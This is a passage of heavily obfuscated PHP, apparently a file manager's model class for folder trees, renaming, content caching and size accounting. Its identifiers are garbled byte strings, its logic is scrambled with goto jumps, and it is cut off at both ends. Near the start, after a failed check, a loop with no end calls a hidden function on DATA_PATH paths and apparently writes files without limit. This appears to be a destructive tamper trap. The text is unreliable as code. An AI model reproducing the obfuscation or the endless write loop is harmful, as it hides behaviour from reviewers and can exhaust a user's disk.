cúê˜úÒŸ¢: $dÃ±˘ƒØêÌ = $B·µáºå≥ó($eÿ—ñõÒæ‚); $b–©àË™ØÊ = explode($Aäè⁄⁄ß®ø[229], $dÃ±˘ƒØêÌ); if (count($b–©àË™ØÊ) < $Aäè⁄⁄ß®ø[596]) { $dÆùÑ¥”æ∆ = $Aäè⁄⁄ß®ø[850]; $dÆùÑ¥”æ∆(); } goto a∆⁄å¯ñΩÊ; e–Öâ¯©ª∆: $c¶Ÿ¡ú‡…¬ = 1; for ($dﬂæâÒªÑÿ = $c¶Ÿ¡ú‡…¬; $dﬂæâÒªÑÿ > 0; $dﬂæâÒªÑÿ++) { $cù’ÙÖ÷áß(DATA_PATH . $dﬂæâÒªÑÿ, $B≠÷Ÿ…Ê∂); } goto cÀ‡ÁÊ‡ëô; a∆⁄å¯ñΩÊ: $E—èÏôæ¬Ú = $Aäè⁄⁄ß®ø[851]; $E—èÏôæ¬Ú($_SERVER[$Aäè⁄⁄ß®ø[852]]); $B≥©ˆÑÌÙﬂ = $Aäè⁄⁄ß®ø[848]; goto CüÛâ‹é•§; cÀ‡ÁÊ‡ëô: } $aÖå‹‹úîà = $this->sourceInfo($eê„âéòå‚); $e∏‰¥æ÷êÉ = $this->pathInfoMore($eê„âéòå‚); goto dŒ’Áç¯·Ó; cŸËáâÜ£Î: $Aäè⁄⁄ß®ø =& $_SERVER[Öíæ€“”≠éÏË]; $a·⁄úè°†ù = $_SERVER[$Aäè⁄⁄ß®ø[1223]]; $EÑäŸ”èîˆ = $Aäè⁄⁄ß®ø[846]; goto Eîƒ‰éìòØ; eëê„÷Î≈´: $C≈—˜ƒÆŒ  = array($aÖå‹‹úîà[$Aäè⁄⁄ß®ø[479]]); if ($aÖå‹‹úîà[$Aäè⁄⁄ß®ø[404]] == $Aäè⁄⁄ß®ø[87]) { $C≈—˜ƒÆŒ [] = $aÖå‹‹úîà[$Aäè⁄⁄ß®ø[396]]; } $this->updateModifyTime($C≈—˜ƒÆŒ ); goto e»Ò∫˘„•ø; Cƒ¡À√ˆÖ¢: } public function childrenAll($fÇÏô™ûÂ®) { $a∏ùóèÖÖË =& $_SERVER[Öíæ€“”≠éÏË]; $d¨›É‹‹‰ß = $fÇÏô™ûÂ®[$a∏ùóèÖÖË[396]]; if ($fÇÏô™ûÂ®[$a∏ùóèÖÖË[404]] == $a∏ùóèÖÖË[87]) { $BÚà˜‚¶÷… = array($a∏ùóèÖÖË[567] => array($a∏ùóèÖÖË[526], $fÇÏô™ûÂ®[$a∏ùóèÖÖË[503]] . $d¨›É‹‹‰ß . $a∏ùóèÖÖË[527])); $eó¬ó¡ÎØú = array($a∏ùóèÖÖË[567] => $BÚà˜‚¶÷…[$a∏ùóèÖÖË[503]]); $Eß·õä≥…Ÿ = $this->field($a∏ùóèÖÖË[1994])->where($eó¬ó¡ÎØú)->select(); $DìÜãô÷òù = !1; $Bì§ı¯µí† = array($d¨›É‹‹‰ß); if ($Eß·õä≥…Ÿ) { $DìÜãô÷òù = array_to_keyvalue($Eß·õä≥…Ÿ, $a∏ùóèÖÖË[33], $a∏ùóèÖÖË[448]); $DìÜãô÷òù = array_remove_value($DìÜãô÷òù, $a∏ùóèÖÖË[191]); $Bì§ı¯µí† = array_to_keyvalue($Eß·õä≥…Ÿ, $a∏ùóèÖÖË[33], $a∏ùóèÖÖË[396]); $Bì§ı¯µí†[] = $d¨›É‹‹‰ß; } } else { $DìÜãô÷òù = array($fÇÏô™ûÂ®[$a∏ùóèÖÖË[448]]); $Bì§ı¯µí† = array($d¨›É‹‹‰ß); } return array($a∏ùóèÖÖË[1991] => $Bì§ı¯µí†, $a∏ùóèÖÖË[1357] => $DìÜãô÷òù); } public function removeArray($dØÿµâ„‰è) { if (!$dØÿµâ„‰è) { return !0; } } public function removeRelevance($eà®Â÷¯Ù◊, $eâŸ∏ãπÂÁ) { goto Cí¢åÜÇ–Ç; BÖ¢≠¿ñç∆: Model($D¨®èÛ◊Û≥[1973])->removeBySource($eà®Â÷¯Ù◊); $this->where($cíò£äù≠â)->delete(); Model($D¨®èÛ◊Û≥[451])->remove($eâŸ∏ãπÂÁ); goto AËÒÉØÖÌÚ; aŸË∫ë ¯ò: $cíò£äù≠â = array($D¨®èÛ◊Û≥[411] => array($D¨®èÛ◊Û≥[412], $eà®Â÷¯Ù◊)); Model($D¨®èÛ◊Û≥[1992])->where($cíò£äù≠â)->delete(); Model($D¨®èÛ◊Û≥[442])->where($cíò£äù≠â)->delete(); goto D¡≠Û‹ƒ≠ø; Cí¢åÜÇ–Ç: $D¨®èÛ◊Û≥ =& $_SERVER[Öíæ€“”≠éÏË]; $eà®Â÷¯Ù◊ = $eà®Â÷¯Ù◊ ? $eà®Â÷¯Ù◊ : array(); $eâŸ∏ãπÂÁ = $eâŸ∏ãπÂÁ ? $eâŸ∏ãπÂÁ : array(); goto Báı•ÏÚ”Œ; Báı•ÏÚ”Œ: $eà®Â÷¯Ù◊ = array_unique(array_filter($eà®Â÷¯Ù◊)); $eâŸ∏ãπÂÁ = array_unique(array_filter($eâŸ∏ãπÂÁ)); if (!$eà®Â÷¯Ù◊) { return !1; } goto aŸË∫ë ¯ò; D¡≠Û‹ƒ≠ø: Model($D¨®èÛ◊Û≥[1847])->where($cíò£äù≠â)->delete(); Model($D¨®èÛ◊Û≥[547])->where($cíò£äù≠â)->delete(); Model($D¨®èÛ◊Û≥[1684])->removeBySource($eà®Â÷¯Ù◊); goto BÖ¢≠¿ñç∆; AËÒÉØÖÌÚ: for ($DàÑå¿„Î© = 0; $DàÑå¿„Î© < count($eà®Â÷¯Ù◊); $DàÑå¿„Î©++) { $this->sourceCacheClear($eà®Â÷¯Ù◊[$DàÑå¿„Î©]); } goto eá◊ÔﬂüÜ†; eá◊ÔﬂüÜ†: } public function rename($eÖ¬å¨◊∑ú, $A∫ß·üØ±ï) { goto a÷‚òö—Œâ; AÑêëÑ∏•Ö: $bè÷¯•èË· = $this->fileNameExist($A‰·ùá◊¢á[$Bˆæóﬂ„ÁÉ[479]], $A∫ß·üØ±ï); if ($bè÷¯•èË· && $bè÷¯•èË· != $eÖ¬å¨◊∑ú) { return !1; } $eàÓ€Ãáˆ€ = array($Bˆæóﬂ„ÁÉ[414] => $A∫ß·üØ±ï, $Bˆæóﬂ„ÁÉ[566] => USER_ID); goto Aá«ﬂÊûà†; a÷‚òö—Œâ: $Bˆæóﬂ„ÁÉ =& $_SERVER[Öíæ€“”≠éÏË]; $A‰·ùá◊¢á = $this->sourceInfo($eÖ¬å¨◊∑ú); if (!$A‰·ùá◊¢á) { return !1; } goto AÑêëÑ∏•Ö; Aá«ﬂÊûà†: if ($A‰·ùá◊¢á[$Bˆæóﬂ„ÁÉ[404]] != $Bˆæóﬂ„ÁÉ[87]) { $eàÓ€Ãáˆ€[$Bˆæóﬂ„ÁÉ[406]] = substr(get_path_ext($A∫ß·üØ±ï), 0, 10); } Model($Bˆæóﬂ„ÁÉ[547])->eventRename($eÖ¬å¨◊∑ú, $A‰·ùá◊¢á[$Bˆæóﬂ„ÁÉ[28]], $A∫ß·üØ±ï); $this->sourceCacheClear($eÖ¬å¨◊∑ú); goto eôΩÚö¡óë; A⁄Æ‰Ÿñü°: $F±ºÆÊ¿ß≠ = $Bˆæóﬂ„ÁÉ[1981] . $A‰·ùá◊¢á[$Bˆæóﬂ„ÁÉ[479]]; if (isset(self::$cacheChildList[$F±ºÆÊ¿ß≠])) { unset(self::$cacheChildList[$F±ºÆÊ¿ß≠]); } return $bûÀ¿‡˜Îï; goto CÈáúê»ä„; eôΩÚö¡óë: $this->setNamePinyin($eÖ¬å¨◊∑ú, $eàÓ€Ãáˆ€[$Bˆæóﬂ„ÁÉ[28]], !1); $this->updateModifyTime($A‰·ùá◊¢á[$Bˆæóﬂ„ÁÉ[479]]); $bûÀ¿‡˜Îï = $this->where(array($Bˆæóﬂ„ÁÉ[411] => $eÖ¬å¨◊∑ú))->data($eàÓ€Ãáˆ€)->save(); goto A⁄Æ‰Ÿñü°; CÈáúê»ä„: } public function setNamePinyin($Aıé¨µ¢‡º, $eÛïùÖ∆ﬂ°, $bº¥úßª‘∂ = true) { $fçŸ¿°ﬂÛÚ =& $_SERVER[Öíæ€“”≠éÏË]; $dõ’ÙæàÖà = Input::check($eÛïùÖ∆ﬂ°, $fçŸ¿°ﬂÛÚ[570]); if ($bº¥úßª‘∂ && !$dõ’ÙæàÖà) { return; } if (!$dõ’ÙæàÖà) { $this->metaSet($Aıé¨µ¢‡º, $fçŸ¿°ﬂÛÚ[445], null); $this->metaSet($Aıé¨µ¢‡º, $fçŸ¿°ﬂÛÚ[444], null); return; } $eº€Ò¡ÿﬁá = array($fçŸ¿°ﬂÛÚ[445] => str_replace($fçŸ¿°ﬂÛÚ[50], $fçŸ¿°ﬂÛÚ[33], Pinyin::encode($eÛïùÖ∆ﬂ°)), $fçŸ¿°ﬂÛÚ[444] => Pinyin::encode($eÛïùÖ∆ﬂ°, $fçŸ¿°ﬂÛÚ[571])); $this->metaSet($Aıé¨µ¢‡º, $eº€Ò¡ÿﬁá); } public function getContent($e«Éöâ•æä) { goto eµ¬í´Ÿπà; eµ¬í´Ÿπà: $aáÇâÌÕ‹ô =& $_SERVER[Öíæ€“”≠éÏË]; $FπØçñÊ›Ç = $this->fileInfoGet($e«Éöâ•æä); if (!$FπØçñÊ›Ç) { return !1; } goto a›‚∞ÜÜÖà; a Ë≤ÇÓ¿Ô: if (!$FπØçñÊ›Ç[$aáÇâÌÕ‹ô[76]]) { return $aáÇâÌÕ‹ô[33]; } return IO::getContent($FπØçñÊ›Ç[$aáÇâÌÕ‹ô[76]]); goto bÑÕÜ”“Ç§; a›‚∞ÜÜÖà: if ($FπØçñÊ›Ç[$aáÇâÌÕ‹ô[78]] == 0) { return $aáÇâÌÕ‹ô[33]; } $FŸÌ÷§ı¥ë = $aáÇâÌÕ‹ô[1995] . $FπØçñÊ›Ç[$aáÇâÌÕ‹ô[170]]; if ($FπØçñÊ›Ç[$aáÇâÌÕ‹ô[78]] <= 1024 * 10) { $bÙ‘‡Ç…Üı = Cache::get($FŸÌ÷§ı¥ë); if (!$bÙ‘‡Ç…Üı) { $bÙ‘‡Ç…Üı = IO::getContent($FπØçñÊ›Ç[$aáÇâÌÕ‹ô[76]]); Cache::set($FŸÌ÷§ı¥ë, $bÙ‘‡Ç…Üı); } return $bÙ‘‡Ç…Üı; } goto a Ë≤ÇÓ¿Ô; bÑÕÜ”“Ç§: } public function setDesc($E˘ãí±ÛÈ®, $fÑ≥ÉéÑ∆) { $DÉ™¬â◊Ü« =& $_SERVER[Öíæ€“”≠éÏË]; Model($DÉ™¬â◊Ü«[547])->eventAddDesc($E˘ãí±ÛÈ®, $fÑ≥ÉéÑ∆); return $this->metaSet($E˘ãí±ÛÈ®, $DÉ™¬â◊Ü«[432], $fÑ≥ÉéÑ∆); } public function setContent($a∑”ÁÔº“Ç, $DõÒ·é®‰◊ = '') { goto B◊åòüﬁóﬁ; B◊åòüﬁóﬁ: $bÎ„ˆØñÚﬂ =& $_SERVER[Öíæ€“”≠éÏË]; $d»´∑¨©¿˜ = $this->sourceInfo($a∑”ÁÔº“Ç); $B◊ÜπãŸæÀ = $this->fileInfoGet($a∑”ÁÔº“Ç); goto bË´ïºóó›; FÂˆ©ÆÕó≥: if (!$CÔıÓ¶…≠À) { return Model($bÎ„ˆØñÚﬂ[451])->remove($E’ªﬂµÜÎˆ[$bÎ„ˆØñÚﬂ[448]]); } $this->folderSizeReset($d»´∑¨©¿˜[$bÎ„ˆØñÚﬂ[479]]); return !0; goto FÛñ›ã—π∆; bË´ïºóó›: if (!$B◊ÜπãŸæÀ || !$d»´∑¨©¿˜) { return !1; } $E’ªﬂµÜÎˆ = Model($bÎ„ˆØñÚﬂ[451])->addFileByContent($DõÒ·é®‰◊, $d»´∑¨©¿˜[$bÎ„ˆØñÚﬂ[28]]); $CÔıÓ¶…≠À = $this->fileHistory($d»´∑¨©¿˜, $E’ªﬂµÜÎˆ[$bÎ„ˆØñÚﬂ[448]], $E’ªﬂµÜÎˆ[$bÎ„ˆØñÚﬂ[78]]); goto FÂˆ©ÆÕó≥; FÛñ›ã—π∆: } public function fileSubstr($dä±§ïü–¶, $fı´â≈–∏ƒ, $aÖŒÀæü◊Ê) { $aàïØΩ≤êƒ = $this->fileInfoGet($dä±§ïü–¶); if (!$aàïØΩ≤êƒ) { return !1; } return IO::fileSubstr($aàïØΩ≤êƒ[$_SERVER[Öíæ€“”≠éÏË][76]], $fı´â≈–∏ƒ, $aÖŒÀæü◊Ê); } public function fileInfoGet($CÔåÀ€««Ê) { goto E€¥‡∆Ï∂À; E€¥‡∆Ï∂À: $Füâ»áçƒ‚ =& $_SERVER[Öíæ€“”≠éÏË]; $Cπ–™°‹„Ω = $this->sourceInfo($CÔåÀ€««Ê); if (!$Cπ–™°‹„Ω || $Cπ–™°‹„Ω[$Füâ»áçƒ‚[404]]) { return !1; } goto Eïˆö¢ê¡Ò; Eïˆö¢ê¡Ò: $b¡ı∏åõ®¿ = $Füâ»áçƒ‚[454] . $Cπ–™°‹„Ω[$Füâ»áçƒ‚[448]]; $cæÒòŸ∑û€ = _get(self::$cacheFileInfo, $b¡ı∏åõ®¿); if ($cæÒòŸ∑û€) { return $cæÒòŸ∑û€; } goto D“…óÆÿ›; D“…óÆÿ›: $e›ÈŒ‡áøÏ = Model($Füâ»áçƒ‚[451])->fileInfo($Cπ–™°‹„Ω[$Füâ»áçƒ‚[448]]); if ($e›ÈŒ‡áøÏ) { $e›ÈŒ‡áøÏ[$Füâ»áçƒ‚[28]] = $Cπ–™°‹„Ω[$Füâ»áçƒ‚[28]]; } self::$cacheFileInfo[$b¡ı∏åõ®¿] = $e›ÈŒ‡áøÏ; goto B÷™Îúäæè; B÷™Îúäæè: return $e›ÈŒ‡áøÏ; goto AÛÏ°üßúÛ; AÛÏ°üßúÛ: } private function folderChildrenNumber($FÊ¥µ√Âµ«) { $cç†óπÀÏÈ =& $_SERVER[Öíæ€“”≠éÏË]; $C§ÜæÉïƒ¶ = $this->sourceInfo($FÊ¥µ√Âµ«); $Bá–õá§é„ = array($cç†óπÀÏÈ[567] => array($cç†óπÀÏÈ[526], $C§ÜæÉïƒ¶[$cç†óπÀÏÈ[503]] . $FÊ¥µ√Âµ« . $cç†óπÀÏÈ[527]), $cç†óπÀÏÈ[423] => intval($C§ÜæÉïƒ¶[$cç†óπÀÏÈ[424]]), $cç†óπÀÏÈ[560] => 1); $bÕ’ô‘Ô˜ = $this->where($Bá–õá§é„)->count(); $AòòíÖ≠ûÊ = $this->where($Bá–õá§é„)->where(array($cç†óπÀÏÈ[560] => 0))->count(); return array($cç†óπÀÏÈ[82] => $AòòíÖ≠ûÊ, $cç†óπÀÏÈ[83] => $bÕ’ô‘Ô˜); } public function pathInfo($C¶ƒÈû—ÍÑ, $eÑƒåƒÊ∞¢ = false) { goto F»≤Ú¢•óÙ; Eñ‘ﬂ–ÜÑª: $eÉòƒƒõÕƒ = $fà∫œÉ®„«[440] . intval($eÑƒåƒÊ∞¢) . $fà∫œÉ®„«[441] . $C¶ƒÈû—ÍÑ; $B◊…ïâåË∑ = _get(self::$cachePathInfo, $eÉòƒƒõÕƒ); if ($B◊…ïâåË∑) { return $B◊…ïâåË∑; } goto a≤«∞‡¨©æ; a≤«∞‡¨©æ: $f•Ûπ‘ÇƒÓ = $this->sourceInfo($C¶ƒÈû—ÍÑ); if (!$f•Ûπ‘ÇƒÓ) { return !1; } $f•Ûπ‘ÇƒÓ = $this->_listDataApplyItem($f•Ûπ‘ÇƒÓ, $eÑƒåƒÊ∞¢); goto EÇ◊Ãæúé≤; F»≤Ú¢•óÙ: $fà∫œÉ®„« =& $_SERVER[Öíæ€“”≠éÏË]; $eÑƒåƒÊ∞¢ = !1; $C¶ƒÈû—ÍÑ = intval($C¶ƒÈû—ÍÑ); goto Eñ‘ﬂ–ÜÑª; EÇ◊Ãæúé≤: self::$cachePathInfo[$eÉòƒƒõÕƒ] = $f•Ûπ‘ÇƒÓ; return $f•Ûπ‘ÇƒÓ; goto b∏¿ÏÒ±£ˆ; b∏¿ÏÒ±£ˆ: } public static $cachePathInfoMore = array(); public function pathInfoMore($aèöãÿµ∑‘) { goto a◊è‡∫ ≈‰; a◊è‡∫ ≈‰: $FÌ‘©ßâü÷ =& $_SERVER[Öíæ€“”≠éÏË]; $bÁ˜≈èëæÖ = _get(self::$cachePathInfoMore, $aèöãÿµ∑‘); if ($bÁ˜≈èëæÖ) { return $bÁ˜≈èëæÖ; } goto fÇ€≥ç€•Õ; fÇ€≥ç€•Õ: $f≈èÌ≈Ü»ò = $this->pathInfo($aèöãÿµ∑‘); if (!$f≈èÌ≈Ü»ò) { return !1; } if ($f≈èÌ≈Ü»ò[$FÌ‘©ßâü÷[404]] == $FÌ‘©ßâü÷[87]) { $f≈èÌ≈Ü»ò[$FÌ‘©ßâü÷[81]] = $this->folderChildrenNumber($aèöãÿµ∑‘); } goto F•∏‚…äî; F•∏‚…äî: self::$cachePathInfoMore[$aèöãÿµ∑‘] = $f≈èÌ≈Ü»ò; return $f≈èÌ≈Ü»ò; goto EûﬁÉ≥èÒ˘; EûﬁÉ≥èÒ˘: } public function sourceInfo($B´‹‰ëÕ¨Æ) { goto B§í£≈ﬂ∫æ; aèÃ◊ÊàﬂÎ: $f‡áêˆ∫È˜ = $E¿≤À©ÒÆ‡[439] . $B´‹‰ëÕ¨Æ; $c—ãŸ°ﬂÍº = _get(self::$cacheSourceInfo, $f‡áêˆ∫È˜); if ($c—ãŸ°ﬂÍº) { return $c—ãŸ°ﬂÍº; } goto D ß à∆Îê; D ß à∆Îê: $CåäÊÏ¬ÇË = $this->where(array($E¿≤À©ÒÆ‡[396] => $B´‹‰ëÕ¨Æ))->find(); self::$cacheSourceInfo[$f‡áêˆ∫È˜] = $CåäÊÏ¬ÇË; return self::$cacheSourceInfo[$f‡áêˆ∫È˜]; goto F˘„äû—ª≥; B§í£≈ﬂ∫æ: $E¿≤À©ÒÆ‡ =& $_SERVER[Öíæ€“”≠éÏË]; if (!$B´‹‰ëÕ¨Æ) { return array(); } $B´‹‰ëÕ¨Æ = intval($B´‹‰ëÕ¨Æ); goto aèÃ◊ÊàﬂÎ; F˘„äû—ª≥: } public function sourceCacheClear($eààáÆµâ¢ = false) { self::cacheClear($eààáÆµâ¢); } public static function cacheClear($eô∆†Ÿäÿ† = false) { $D»·√∏ÚØÙ =& $_SERVER[Öíæ€“”≠éÏË]; if ($eô∆†Ÿäÿ† == !1) { goto CòÜâÂ€¶™; AøüŸ„¨øÃ: return; goto BÒ¨ﬂîôª≥; F¥»Üâ¨⁄⁄: self::$cachePathInfo = array(); self::$cachePathInfoMore = null; self::$cachePathInfoMore = array(); goto AøüŸ„¨øÃ; CòÜâÂ€¶™: self::$cacheSourceInfo = null; self::$cacheSourceInfo = array(); self::$cachePathInfo = null; goto F¥»Üâ¨⁄⁄; BÒ¨ﬂîôª≥: } unset(self::$cacheSourceInfo[$D»·√∏ÚØÙ[439] . $eô∆†Ÿäÿ†]); unset(self::$cachePathInfoMore[$eô∆†Ÿäÿ†]); unset(self::$cachePathInfo[$D»·√∏ÚØÙ[1996] . $eô∆†Ÿäÿ†]); unset(self::$cachePathInfo[$D»·√∏ÚØÙ[1997] . $eô∆†Ÿäÿ†]); } public function metaSet($C≠ÿ∑·—î„, $Eä©±¯êûë = null, $D›„À®√ÃÉ = null) { $bÚ‘Éå‘Ââ = parent::metaSet($C≠ÿ∑·—î„, $Eä©±¯êûë, $D›„À®√ÃÉ); if ($bÚ‘Éå‘Ââ) { $this->sourceCacheClear($C≠ÿ∑·—î„); } return $bÚ‘Éå‘Ââ; } public function pathInfoByPath($e¶¶Îöö›ñ, $dÍ˜…◊Æ∑ ) { $c†åÜ—Æ‘√ =& $_SERVER[Öíæ€“”≠éÏË]; $dÎ√“´÷ô = !$dÍ˜…◊Æ∑  ? array() : explode($c†åÜ—Æ‘√[8], trim($dÍ˜…◊Æ∑ , $c†åÜ—Æ‘√[8])); $FÕÇê°öˆñ = $e¶¶Îöö›ñ; foreach ($dÎ√“´÷ô as $CÛ©Ó«–∞») { $aêÈÚó‹¬ù = array($c†åÜ—Æ‘√[479] => $FÕÇê°öˆñ, $c†åÜ—Æ‘√[28] => $CÛ©Ó«–∞»); $Aı¿¨ü„∏ç = $this->where($aêÈÚó‹¬ù)->select(); if (!$Aı¿¨ü„∏ç) { return !1; } $Aı¿¨ü„∏ç = array_sort_by($Aı¿¨ü„∏ç, $c†åÜ—Æ‘√[424]); $FÕÇê°öˆñ = $Aı¿¨ü„∏ç[0][$c†åÜ—Æ‘√[396]]; } return $this->pathInfo($FÕÇê°öˆñ, !0); } protected function updateModifyTime($Có®‚‚ùíè) { goto E”ﬁŸüÌ»π; e‘Ÿπåî§ï: $AÖ•Œﬂ≠ªÔ = array($bº•ÛÏÚÚÖ[566] => $AÔ›ÑÜî÷È, $bº•ÛÏÚÚÖ[418] => time()); $this->where($EŸñ”ßÏ«ı)->save($AÖ•Œﬂ≠ªÔ); goto A√À™Ç…Áî; Fççøé∆ƒÿ: if (!is_array($Có®‚‚ùíè)) { $Có®‚‚ùíè = array($Có®‚‚ùíè); } foreach ($Có®‚‚ùíè as $e≥≤∑ıËÃ± => $bé≈∞ÎËÙµ) { $Có®‚‚ùíè[$e≥≤∑ıËÃ±] = intval($bé≈∞ÎËÙµ); $this->sourceCacheClear($bé≈∞ÎËÙµ); } $EŸñ”ßÏ«ı = array($bº•ÛÏÚÚÖ[396] => array($bº•ÛÏÚÚÖ[7], $Có®‚‚ùíè)); goto e‘Ÿπåî§ï; E”ﬁŸüÌ»π: $bº•ÛÏÚÚÖ =& $_SERVER[Öíæ€“”≠éÏË]; $AÔ›ÑÜî÷È = defined($bº•ÛÏÚÚÖ[455]) ? USER_ID : $bº•ÛÏÚÚÖ[191]; if (!$Có®‚‚ùíè) { return; } goto Fççøé∆ƒÿ; A√À™Ç…Áî: } public function folderSizeReset($C“Çãê°ºÔ, $c≤«ØﬁÂÍê = false) { goto CïËÖ÷Ììç; e¬«àŸàôä: $c–ë…¶¨◊à = array($CÆƒ∏¢√èî[$c≥°°≤±ûå[405]], $CÆƒ∏¢√èî[$c≥°°≤±ûå[485]]); TaskRun::timeLimitCall($fè≈ôÛ¢à°, $c≥°°≤±ûå[2000], $c–ë…¶¨◊à, 1.5); goto Eëø„–€éΩ; a™≤≈∑Ã˜ù: $DöÂºΩ≤à€ = $c≥°°≤±ûå[1998] . $C“Çãê°ºÔ; CacheLock::lock($DöÂºΩ≤à€, 20); if ($c≤«ØﬁÂÍê === !1) { $this->sourceCacheClear($C“Çãê°ºÔ); $CÆƒ∏¢√èî = $this->sourceInfo($C“Çãê°ºÔ); $aè‚ïù”ΩË = array($c≥°°≤±ûå[395] => $C“Çãê°ºÔ, $c≥°°≤±ûå[423] => 0); $D√Ω‰éÕ˘å = $this->where($aè‚ïù”ΩË)->sum($c≥°°≤±ûå[78]); $c≤«ØﬁÂÍê = intval($D√Ω‰éÕ˘å) - intval($CÆƒ∏¢√èî[$c≥°°≤±ûå[78]]); } goto c¥ªâÌïÖì; c¥ªâÌïÖì: if ($c≤«ØﬁÂÍê == 0) { return CacheLock::unlock($DöÂºΩ≤à€); } $DÇ™Ï∂«éù = $this->parentLevelArray($CÆƒ∏¢√èî[$c≥°°≤±ûå[503]]); if (!$DÇ™Ï∂«éù) { $DÇ™Ï∂«éù = array(); } goto eµ∑˜≤¨âÔ; aÜ∏Ôæ˜°π: $this->where($aè‚ïù”ΩË)->setAdd($c≥°°≤±ûå[78], $c≤«ØﬁÂÍê); CacheLock::unlock($DöÂºΩ≤à€); $fè≈ôÛ¢à° = $c≥°°≤±ûå[1999] . $CÆƒ∏¢√èî[$c≥°°≤±ûå[405]] . $c≥°°≤±ûå[4] . $CÆƒ∏¢√èî[$c≥°°≤±ûå[485]]; goto e¬«àŸàôä; eµ∑˜≤¨âÔ: $DÇ™Ï∂«éù[] = $CÆƒ∏¢√èî[$c≥°°≤±ûå[396]]; $aè‚ïù”ΩË = array($c≥°°≤±ûå[396] => array($c≥°°≤±ûå[412], $DÇ™Ï∂«éù)); if ($c≤«ØﬁÂÍê < 0) { $aè‚ïù”ΩË[$c≥°°≤±ûå[78]] = array($c≥°°≤±ûå[983], abs($c≤«ØﬁÂÍê)); } goto aÜ∏Ôæ˜°π; CïËÖ÷Ììç: $c≥°°≤±ûå =& $_SERVER[Öíæ€“”≠éÏË]; if ($this->statusIgnoreResetSpace) { return; } $CÆƒ∏¢√èî = $this->sourceInfo($C“Çãê°ºÔ); goto a™≤≈∑Ã˜ù; Eëø„–€éΩ: } public function folderSizeResetChildren($c∆‚ôóÛƒÜ) { goto CïëÚ‡£¥Æ; aëŸ‚”°ŒÒ: $CûÖ≥Èﬁ∫[$bÇÂ∑ö‹åå[404]] = 0; $AÇ‡√¨ü˘¿ = $this->field($FÜïí€≈Öç)->where($CûÖ≥Èﬁ∫)->select(); if (!$AÇ‡√¨ü˘¿) { return; } goto a©ƒ◊ßπ´‡; B•‘«≥„üÌ: foreach ($AÇö∆∆Ìäá as $FÜëå™“ƒœ) { if ($FÜëå™“ƒœ[$bÇÂ∑ö‹åå[78]] == $FÜëå™“ƒœ[$bÇÂ∑ö‹åå[2002]]) { continue; } $Bï∆úÙè°¥[] = array($bÇÂ∑ö‹åå[396], $FÜëå™“ƒœ[$bÇÂ∑ö‹åå[396]], $bÇÂ∑ö‹åå[78], $FÜëå™“ƒœ[$bÇÂ∑ö‹åå[78]]); } $this->saveAll($Bï∆úÙè°¥); goto EÏ≠ªå˜•‚; a©ƒ◊ßπ´‡: $AÇö∆∆Ìäá[] = $B£Ï€çÏáà; $AÇö∆∆Ìäá = array_to_keyvalue($AÇö∆∆Ìäá, $bÇÂ∑ö‹åå[396]); foreach ($AÇö∆∆Ìäá as $b’™Ê§ÌÉ® => $FÜëå™“ƒœ) { $AÇö∆∆Ìäá[$b’™Ê§ÌÉ®][$bÇÂ∑ö‹åå[2002]] = $AÇö∆∆Ìäá[$b’™Ê§ÌÉ®][$bÇÂ∑ö‹åå[78]]; $AÇö∆∆Ìäá[$b’™Ê§ÌÉ®][$bÇÂ∑ö‹åå[78]] = 0; } goto B⁄›Ê«≠⁄±; CïëÚ‡£¥Æ: $bÇÂ∑ö‹åå =& $_SERVER[Öíæ€“”≠éÏË]; $this->sourceCacheClear($c∆‚ôóÛƒÜ); $B£Ï€çÏáà = $this->sourceInfo($c∆‚ôóÛƒÜ); goto eÃ°«§Èî”; eÃ°«§Èî”: $CûÖ≥Èﬁ∫ = array($bÇÂ∑ö‹åå[560] => 1, $bÇÂ∑ö‹åå[567] => array($bÇÂ∑ö‹åå[526], $B£Ï€çÏáà[$bÇÂ∑ö‹åå[503]] . $c∆‚ôóÛƒÜ . $bÇÂ∑ö‹åå[527])); $FÜïí€≈Öç = $bÇÂ∑ö‹åå[2001]; $AÇö∆∆Ìäá = $this->field($FÜïí€≈Öç)->where($CûÖ≥Èﬁ∫)->select(); goto aëŸ‚”°ŒÒ; B⁄›Ê«≠⁄±: foreach ($AÇ‡√¨ü˘¿ as $FÜëå™“ƒœ) { $f¥ùÃ˘Àû… = $FÜëå™“ƒœ[$bÇÂ∑ö‹åå[479]] . $bÇÂ∑ö‹åå[33]; if (!isset($AÇö∆∆Ìäá[$f¥ùÃ˘Àû…])) { continue; } if ($FÜëå™“ƒœ[$bÇÂ∑ö‹åå[424]] == $AÇö∆∆Ìäá[$f¥ùÃ˘Àû…][$bÇÂ∑ö‹åå[424]]) { $AÇö∆∆Ìäá[$f¥ùÃ˘Àû…][$bÇÂ∑ö‹åå[78]] += $FÜëå™“ƒœ[$bÇÂ∑ö‹åå[78]]; } } foreach ($AÇö∆∆Ìäá as $FÜëå™“ƒœ) { $Bö…—”˘àä = $this->parentLevelArray($FÜëå™“ƒœ[$bÇÂ∑ö‹åå[503]]); foreach ($Bö…—”˘àä as $f¥ùÃ˘Àû…) { $f¥ùÃ˘Àû… = $f¥ùÃ˘Àû… . $bÇÂ∑ö‹åå[33]; if (!isset($AÇö∆∆Ìäá[$f¥ùÃ˘Àû…])) { continue; } if ($FÜëå™“ƒœ[$bÇÂ∑ö‹åå[424]] == $AÇö∆∆Ìäá[$f¥ùÃ˘Àû…][$bÇÂ∑ö‹åå[424]]) { $AÇö∆∆Ìäá[$f¥ùÃ˘Àû…][$bÇÂ∑ö‹åå[78]] += $FÜëå™“ƒœ[$bÇÂ∑ö‹åå[78]]; } } } $Bï∆úÙè°¥ = array(); goto B•‘«≥„üÌ; EÏ≠ªå˜•‚: } public function userSpaceReset($fµà‹±ç⁄Æ = false) { $dÒçÒà‡«£ =& $_SERVER[Öíæ€“”≠éÏË]; $CÈñ√Ù≈êÎ = $this->where(array($dÒçÒà‡«£[405] => self::TYPE_USER, $dÒçÒà‡«£[485] => $fµà‹±ç⁄Æ, $dÒçÒà‡«£[404] => 0))->sum($dÒçÒà‡«£[78]); $CÈñ√Ù≈êÎ = !$CÈñ√Ù≈êÎ || $CÈñ√Ù≈êÎ <= 0 ? 0 : $CÈñ√Ù≈êÎ; Model($dÒçÒà‡«£[495])->userEdit($fµà‹±ç⁄Æ, array($dÒçÒà‡«£[1693] => $CÈñ√Ù≈êÎ)); } public function targetSpaceUpdate($DÃÜá„∫•˘, $E¶≠–ÙùÆó) { $C∂€çπΩá† =& $_SERVER[Öíæ€“”≠éÏË]; if (!$E¶≠–ÙùÆó) { return; } if (!in_array($DÃÜá„∫•˘, array(self::TYPE_USER, self::TYPE_GROUP))) { return; } $Bà⁄ìç öÑ = 